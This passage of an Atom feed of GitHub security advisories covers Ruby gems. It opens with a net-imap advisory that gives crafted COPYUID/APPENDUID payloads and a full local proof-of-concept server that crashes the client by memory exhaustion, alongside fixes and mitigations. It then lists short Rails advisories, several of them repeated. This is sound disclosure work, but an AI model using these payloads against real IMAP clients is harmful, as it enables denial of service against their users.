        <title type="html"><![CDATA[[net-imap] Possible DoS by memory exhaustion in net-imap]]></title>
        <id>https://github.com/advisories/GHSA-7fc5-f82f-cx69</id>
        <link href="https://github.com/advisories/GHSA-7fc5-f82f-cx69"/>
        <updated>2025-02-11T21:39:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>
<h3 id="details">Details</h3>
<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>"1,2,3,4,5"</code> and <code>"1:5"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>
<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>
<p>Malicious inputs:</p>
<pre><code class="language-ruby"># 40 bytes expands to ~1.6GB:
"* OK [COPYUID 1 1:99999999 1:99999999]\r\n"

# Worst *valid* input scenario (using uint32 max),
# 44 bytes expands to 64GiB:
"* OK [COPYUID 1 1:4294967295 1:4294967295]\r\n"

# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than
# UINT32_MAX can be created.  For example, the following would theoretically
# expand to almost 800 exabytes:
"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\r\n"
</code></pre>
<p>Simple way to test this:</p>
<pre><code class="language-ruby">require "net/imap"

def test(size)
  input = "A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\r\n"
  parser = Net::IMAP::ResponseParser.new
  parser.parse input
end

test(99_999_999)
</code></pre>
<h3 id="fixes">Fixes</h3>
<h4 id="preferred-fix-minor-api-changes">Preferred Fix, minor API changes</h4>
<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>
<pre><code class="language-ruby"># globally
Net::IMAP.config.parser_use_deprecated_uidplus_data = false
# per-client
imap = Net::IMAP.new(hostname, ssl: true,
                               parser_use_deprecated_uidplus_data: false)
imap.config.parser_use_deprecated_uidplus_data = false
</code></pre>
<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">UIDPlusData</a>, <a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">AppendUIDData</a> and <a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">CopyUIDData</a>.</p>
<p>For v0.3.8, this option is not available.
For v0.4.19, the default value is <code>true</code>.
For v0.5.6, the default value is <code>:up_to_max_size</code>.
For v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
<h4 id="mitigation-backward-compatible-api">Mitigation, backward compatible API</h4>
<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>
<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>
<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.
When <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will raise <code>Net::IMAP::ResponseParseError</code>.
When  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>
<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.
For v0.4.19, the limit defaults to 1000.
For v0.5.6, the limit defaults to 100.
For v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
<h4 id="please-note-unhandled-responses">Please Note: unhandled responses</h4>
<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>
<pre><code class="language-ruby">limit = 1000
imap.add_response_handler do |resp|
  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)
  name = resp.name
  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)
  if Net::IMAP::VERSION &gt; "0.4.0"
    imap.responses(name) { _1.slice!(0...-limit) }
    imap.responses(code) { _1.slice!(0...-limit) }
  else
    imap.responses(name).slice!(0...-limit)
    imap.responses(code).slice!(0...-limit)
  end
end
</code></pre>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>
<pre><code class="language-ruby">#!/usr/bin/env ruby
require 'socket'
require 'net/imap'

if !defined?(Net::IMAP.config)
  puts "Net::IMAP.config is not available"
elsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)
  puts "Net::IMAP.config.parser_use_deprecated_uidplus_data is not available"
else
  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size
  puts "Updated parser_use_deprecated_uidplus_data to :up_to_max_size"
end

size = Integer(ENV["UID_SET_SIZE"] || 2**32-1)

def server_addr
  Addrinfo.tcp("localhost", 0).ip_address
end

def create_tcp_server
  TCPServer.new(server_addr, 0)
end

def start_server
  th = Thread.new do
    yield
  end
  sleep 0.1 until th.stop?
end

def copyuid_response(tag: "*", size: 2**32-1, text: "too large?")
  "#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\r\n"
end

def appenduid_response(tag: "*", size: 2**32-1, text: "too large?")
  "#{tag} OK [APPENDUID 1 1:#{size}] #{text}\r\n"
end

server = create_tcp_server
port = server.addr[1]
puts "Server started on port #{port}"

# server
start_server do
  sock = server.accept
  begin
    sock.print "* OK test server\r\n"
    cmd = sock.gets("\r\n", chomp: true)
    tag = cmd.match(/\A(\w+) /)[1]
    puts "Received: #{cmd}"

    malicious_response = appenduid_response(size:)
    puts "Sending: #{malicious_response.chomp}"
    sock.print malicious_response

    malicious_response = copyuid_response(size:)
    puts "Sending: #{malicious_response.chomp}"
    sock.print malicious_response
    sock.print "* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\r\n"
    sock.print "#{tag} OK CAPABILITY completed\r\n"

    cmd = sock.gets("\r\n", chomp: true)
    tag = cmd.match(/\A(\w+) /)[1]
    puts "Received: #{cmd}"
    sock.print "* BYE If you made it this far, you passed the test!\r\n"
    sock.print "#{tag} OK LOGOUT completed\r\n"
  rescue Exception =&gt; ex
    puts "Error in server: #{ex.message} (#{ex.class})"
  ensure
    sock.close
    server.close
  end
end

# client
begin
  puts "Client connecting,.."
  imap = Net::IMAP.new(server_addr, port: port)
  puts "Received capabilities: #{imap.capability}"
  pp responses: imap.responses
  imap.logout
rescue Exception =&gt; ex
  puts "Error in client: #{ex.message} (#{ex.class})"
  puts ex.full_message
ensure
  imap.disconnect if imap
end
</code></pre>
<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>
<pre><code class="language-console">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )
Server started on port 34291
Client connecting,..
Received: RUBY0001 CAPABILITY
Sending: * OK [APPENDUID 1 1:4294967295] too large?
Sending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?
Error in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)
Error in client: failed to allocate memory (NoMemoryError)
/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)
        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'
        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'
        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'
        from /workspace/poc.rb:70:in '&lt;main&gt;'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25186">https://nvd.nist.gov/vuln/detail/CVE-2025-25186</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3">https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022">https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-7fc5-f82f-cx69">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7fc5-f82f-cx69</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-10T17:42:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actionpack] Action Pack contains database-query restrictions bypass]]></title>
        <id>https://github.com/advisories/GHSA-hgpp-pp89-4fgf</id>
        <link href="https://github.com/advisories/GHSA-hgpp-pp89-4fgf"/>
        <updated>2025-01-22T15:18:27.000Z</updated>
        <content type="html"><![CDATA[<p><code>actionpack/lib/action_dispatch/http/request.rb</code> in Ruby on Rails before 2.3.16, 3.0.x before 3.0.13, 3.1.x before 3.1.5, and 3.2.x before 3.2.4 does not properly consider differences in parameter handling between the Active Record component and the Rack interface, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks via a crafted request, as demonstrated by certain <code>[nil]</code> values, a related issue to CVE-2012-2694.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2660">https://nvd.nist.gov/vuln/detail/CVE-2012-2660</a></li>
<li><a href="https://groups.google.com/group/rubyonrails-security/msg/d890f8d58b5fbf32?dmode=source&amp;output=gplain">https://groups.google.com/group/rubyonrails-security/msg/d890f8d58b5fbf32?dmode=source&amp;output=gplain</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00017.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00017.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0154.html">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2012-2660.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2012-2660.yml</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2660.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2660.yml</a></li>
<li><a href="https://groups.google.com/g/rubyonrails-security/c/8SA-M3as7A8/m/Mr9fi9X4kNgJ">https://groups.google.com/g/rubyonrails-security/c/8SA-M3as7A8/m/Mr9fi9X4kNgJ</a></li>
<li><a href="https://github.com/rails/rails/commit/61eed87ce32caf534bf1f52dd8134097b4ad9e1b">https://github.com/rails/rails/commit/61eed87ce32caf534bf1f52dd8134097b4ad9e1b</a></li>
<li><a href="https://github.com/advisories/GHSA-hgpp-pp89-4fgf">https://github.com/advisories/GHSA-hgpp-pp89-4fgf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hgpp-pp89-4fgf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2017-10-24T18:33:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actionpack] Action Pack contains database-query restrictions bypass]]></title>
        <id>https://github.com/advisories/GHSA-hgpp-pp89-4fgf</id>
        <link href="https://github.com/advisories/GHSA-hgpp-pp89-4fgf"/>
        <updated>2025-01-22T15:18:27.000Z</updated>
        <content type="html"><![CDATA[<p><code>actionpack/lib/action_dispatch/http/request.rb</code> in Ruby on Rails before 2.3.16, 3.0.x before 3.0.13, 3.1.x before 3.1.5, and 3.2.x before 3.2.4 does not properly consider differences in parameter handling between the Active Record component and the Rack interface, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks via a crafted request, as demonstrated by certain <code>[nil]</code> values, a related issue to CVE-2012-2694.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2660">https://nvd.nist.gov/vuln/detail/CVE-2012-2660</a></li>
<li><a href="https://groups.google.com/group/rubyonrails-security/msg/d890f8d58b5fbf32?dmode=source&amp;output=gplain">https://groups.google.com/group/rubyonrails-security/msg/d890f8d58b5fbf32?dmode=source&amp;output=gplain</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00017.html">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00017.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0154.html">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2012-2660.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2012-2660.yml</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2660.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2660.yml</a></li>
<li><a href="https://groups.google.com/g/rubyonrails-security/c/8SA-M3as7A8/m/Mr9fi9X4kNgJ">https://groups.google.com/g/rubyonrails-security/c/8SA-M3as7A8/m/Mr9fi9X4kNgJ</a></li>
<li><a href="https://github.com/rails/rails/commit/61eed87ce32caf534bf1f52dd8134097b4ad9e1b">https://github.com/rails/rails/commit/61eed87ce32caf534bf1f52dd8134097b4ad9e1b</a></li>
<li><a href="https://github.com/advisories/GHSA-hgpp-pp89-4fgf">https://github.com/advisories/GHSA-hgpp-pp89-4fgf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hgpp-pp89-4fgf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2017-10-24T18:33:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actionpack] actionpack Improper Authentication vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-92w9-2pqw-rhjj</id>
        <link href="https://github.com/advisories/GHSA-92w9-2pqw-rhjj"/>
        <updated>2025-01-22T15:09:52.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>decode_credentials</code> method in <code>actionpack/lib/action_controller/metal/http_authentication.rb</code> in Ruby on Rails before 3.0.16, 3.1.x before 3.1.7, and 3.2.x before 3.2.7 converts Digest Authentication strings to symbols, which allows remote attackers to cause a denial of service by leveraging access to an application that uses a <code>with_http_digest</code> helper method, as demonstrated by the <code>authenticate_or_request_with_http_digest</code> method.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-3424">https://nvd.nist.gov/vuln/detail/CVE-2012-3424</a></li>
<li><a href="https://groups.google.com/group/rubyonrails-security/msg/244d32f2fa25147d?hl=en&amp;dmode=source&amp;output=gplain">https://groups.google.com/group/rubyonrails-security/msg/244d32f2fa25147d?hl=en&amp;dmode=source&amp;output=gplain</a></li>
<li><a href="http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0154.html">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>
<li><a href="https://github.com/rails/rails/commit/3719bd3e95523c5518507dbe44f260f252930600">https://github.com/rails/rails/commit/3719bd3e95523c5518507dbe44f260f252930600</a></li>
<li><a href="http://weblog.rubyonrails.org/2012/7/26/ann-rails-3-2-7-has-been-released">http://weblog.rubyonrails.org/2012/7/26/ann-rails-3-2-7-has-been-released</a></li>
<li><a href="https://github.com/advisories/GHSA-92w9-2pqw-rhjj">https://github.com/advisories/GHSA-92w9-2pqw-rhjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-92w9-2pqw-rhjj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2017-10-24T18:33:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actionpack] actionpack Improper Authentication vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-92w9-2pqw-rhjj</id>
        <link href="https://github.com/advisories/GHSA-92w9-2pqw-rhjj"/>
        <updated>2025-01-22T15:09:52.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>decode_credentials</code> method in <code>actionpack/lib/action_controller/metal/http_authentication.rb</code> in Ruby on Rails before 3.0.16, 3.1.x before 3.1.7, and 3.2.x before 3.2.7 converts Digest Authentication strings to symbols, which allows remote attackers to cause a denial of service by leveraging access to an application that uses a <code>with_http_digest</code> helper method, as demonstrated by the <code>authenticate_or_request_with_http_digest</code> method.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-3424">https://nvd.nist.gov/vuln/detail/CVE-2012-3424</a></li>
<li><a href="https://groups.google.com/group/rubyonrails-security/msg/244d32f2fa25147d?hl=en&amp;dmode=source&amp;output=gplain">https://groups.google.com/group/rubyonrails-security/msg/244d32f2fa25147d?hl=en&amp;dmode=source&amp;output=gplain</a></li>
<li><a href="http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0154.html">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>
<li><a href="https://github.com/rails/rails/commit/3719bd3e95523c5518507dbe44f260f252930600">https://github.com/rails/rails/commit/3719bd3e95523c5518507dbe44f260f252930600</a></li>
<li><a href="http://weblog.rubyonrails.org/2012/7/26/ann-rails-3-2-7-has-been-released">http://weblog.rubyonrails.org/2012/7/26/ann-rails-3-2-7-has-been-released</a></li>
<li><a href="https://github.com/advisories/GHSA-92w9-2pqw-rhjj">https://github.com/advisories/GHSA-92w9-2pqw-rhjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-92w9-2pqw-rhjj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2017-10-24T18:33:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[activerecord] Active Record contains SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-gh2w-j7cx-2664</id>
        <link href="https://github.com/advisories/GHSA-gh2w-j7cx-2664"/>
        <updated>2025-01-21T16:47:33.000Z</updated>
        <content type="html"><![CDATA[<p>SQL injection vulnerability in the Active Record component in Ruby on Rails before 2.3.15, 3.0.x before 3.0.18, 3.1.x before 3.1.9, and 3.2.x before 3.2.10 allows remote attackers to execute arbitrary SQL commands via a crafted request that leverages incorrect behavior of dynamic finders in applications that can use unexpected data types in certain find_by_ method calls.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6496">https://nvd.nist.gov/vuln/detail/CVE-2012-6496</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=889649">https://bugzilla.redhat.com/show_bug.cgi?id=889649</a></li>
<li><a href="https://groups.google.com/group/rubyonrails-security/msg/23daa048baf28b64?dmode=source&amp;output=gplain">https://groups.google.com/group/rubyonrails-security/msg/23daa048baf28b64?dmode=source&amp;output=gplain</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0154.html">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0220.html">http://rhn.redhat.com/errata/RHSA-2013-0220.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0544.html">http://rhn.redhat.com/errata/RHSA-2013-0544.html</a></li>
<li><a href="http://security.gentoo.org/glsa/glsa-201401-22.xml">http://security.gentoo.org/glsa/glsa-201401-22.xml</a></li>
<li><a href="https://github.com/rails/rails/commit/9de9b359d0d24f70f0f6c5c58a7ad8750684d456">https://github.com/rails/rails/commit/9de9b359d0d24f70f0f6c5c58a7ad8750684d456</a></li>
<li><a href="http://blog.phusion.nl/2013/01/03/rails-sql-injection-vulnerability-hold-your-horses-here-are-the-facts">http://blog.phusion.nl/2013/01/03/rails-sql-injection-vulnerability-hold-your-horses-here-are-the-facts</a></li>
<li><a href="https://github.com/advisories/GHSA-gh2w-j7cx-2664">https://github.com/advisories/GHSA-gh2w-j7cx-2664</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gh2w-j7cx-2664</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2017-10-24T18:33:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[activesupport] activesupport Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-h835-75hw-pj89</id>
        <link href="https://github.com/advisories/GHSA-h835-75hw-pj89"/>
        <updated>2025-01-21T16:47:01.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in <code>activesupport/lib/active_support/core_ext/string/output_safety.rb</code> in Ruby on Rails before 2.3.16, 3.0.x before , 3.1.x before 3.1.8, and 3.2.x before 3.2.8 might allow remote attackers to inject arbitrary web script or HTML via vectors involving a ' (quote) character.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-3464">https://nvd.nist.gov/vuln/detail/CVE-2012-3464</a></li>
<li><a href="https://github.com/advisories/GHSA-h835-75hw-pj89">https://github.com/advisories/GHSA-h835-75hw-pj89</a></li>
<li><a href="https://groups.google.com/group/rubyonrails-security/msg/8f1bbe1cef8c6caf?dmode=source&amp;output=gplain">https://groups.google.com/group/rubyonrails-security/msg/8f1bbe1cef8c6caf?dmode=source&amp;output=gplain</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0154.html">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>
<li><a href="https://github.com/rails/rails/issues/7215">https://github.com/rails/rails/issues/7215</a></li>
<li><a href="https://github.com/rails/rails/commit/28f2c6f4037081da0a82104a3f473165ed4ed2ce">https://github.com/rails/rails/commit/28f2c6f4037081da0a82104a3f473165ed4ed2ce</a></li>
<li><a href="https://github.com/rails/rails/commit/780a718723cf87b49cfe204d355948c4e0932d23">https://github.com/rails/rails/commit/780a718723cf87b49cfe204d355948c4e0932d23</a></li>
<li><a href="https://github.com/rails/rails/commit/d0c9759d3aeb6327d68dd6c0de0fe2fed4e3c870">https://github.com/rails/rails/commit/d0c9759d3aeb6327d68dd6c0de0fe2fed4e3c870</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activesupport/CVE-2012-3464.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activesupport/CVE-2012-3464.yml</a></li>
<li><a href="https://github.com/rails/rails/commit/d549df7133f2b0bad8112890d478c33e990e12bc">https://github.com/rails/rails/commit/d549df7133f2b0bad8112890d478c33e990e12bc</a></li>
<li><a href="http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released">http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h835-75hw-pj89</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2017-10-24T18:33:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[activerecord] Active Record contains SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-gh2w-j7cx-2664</id>
        <link href="https://github.com/advisories/GHSA-gh2w-j7cx-2664"/>
        <updated>2025-01-21T16:47:33.000Z</updated>
        <content type="html"><![CDATA[<p>SQL injection vulnerability in the Active Record component in Ruby on Rails before 2.3.15, 3.0.x before 3.0.18, 3.1.x before 3.1.9, and 3.2.x before 3.2.10 allows remote attackers to execute arbitrary SQL commands via a crafted request that leverages incorrect behavior of dynamic finders in applications that can use unexpected data types in certain find_by_ method calls.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2012-6496">https://nvd.nist.gov/vuln/detail/CVE-2012-6496</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=889649">https://bugzilla.redhat.com/show_bug.cgi?id=889649</a></li>
<li><a href="https://groups.google.com/group/rubyonrails-security/msg/23daa048baf28b64?dmode=source&amp;output=gplain">https://groups.google.com/group/rubyonrails-security/msg/23daa048baf28b64?dmode=source&amp;output=gplain</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0154.html">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0220.html">http://rhn.redhat.com/errata/RHSA-2013-0220.html</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0544.html">http://rhn.redhat.com/errata/RHSA-2013-0544.html</a></li>
<li><a href="http://security.gentoo.org/glsa/glsa-201401-22.xml">http://security.gentoo.org/glsa/glsa-201401-22.xml</a></li>
<li><a href="https://github.com/rails/rails/commit/9de9b359d0d24f70f0f6c5c58a7ad8750684d456">https://github.com/rails/rails/commit/9de9b359d0d24f70f0f6c5c58a7ad8750684d456</a></li>
<li><a href="http://blog.phusion.nl/2013/01/03/rails-sql-injection-vulnerability-hold-your-horses-here-are-the-facts">http://blog.phusion.nl/2013/01/03/rails-sql-injection-vulnerability-hold-your-horses-here-are-the-facts</a></li>
<li><a href="https://github.com/advisories/GHSA-gh2w-j7cx-2664">https://github.com/advisories/GHSA-gh2w-j7cx-2664</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gh2w-j7cx-2664</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2017-10-24T18:33:37.000Z</published>
    </entry>
    <entry>
